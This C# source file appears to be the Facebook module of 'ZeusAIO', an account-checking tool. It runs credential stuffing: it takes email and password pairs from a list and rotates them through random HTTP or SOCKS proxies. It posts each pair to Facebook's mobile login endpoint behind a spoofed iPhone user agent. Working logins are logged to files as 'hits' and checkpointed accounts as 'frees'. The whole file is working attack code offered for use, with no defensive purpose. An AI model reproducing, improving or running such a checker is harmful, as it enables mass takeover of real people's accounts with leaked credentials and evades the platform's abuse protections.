using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Facebook
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            string str = "m_ts=1550180232&li=iN9lXBSfEc8xIHSKjFOe2vkx&try_number=0&unrecognized_tries=0&email=" + s[0] + "&pass=" + s[1] + "&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&had_cp_prefilled=false&had_password_prefilled=false&is_smart_lock=false&m_sess=&fb_dtsg=AQF6C0mj3hNf%3AAQGjTNnbLzLJ&jazoest=22034&lsd=AVri6wcw&__dyn=0wzp5Bwk8aU4ifDgy79pk2m3q12wAxu13w9y1DxW0Oohx61rwf24o29wmU3XwIwk9E4W0om783pwbO0o2US1kw5Kxmayo&__req=9&__ajax__=AYkbGOHTAqPBWedhRIHfEH-kFiBJmDdmTayxDqjTS3OQBinpNmq9rxYX3qOAArwuR2Byhhz4HJlxUBSye6VR7b6k2h4OiJeYukTQr8fy1wnR6A&__user=0";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("provided_or_soft_matched") || strResponse.Contains("oauth_login_elem_payload"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("checkpoint"))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui== "2")
                                    {
                                        Console.WriteLine("[FREE - FACEBOOK] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Facebook_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else if (strResponse.Contains("save-device"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - FACEBOOK] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Facebook_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
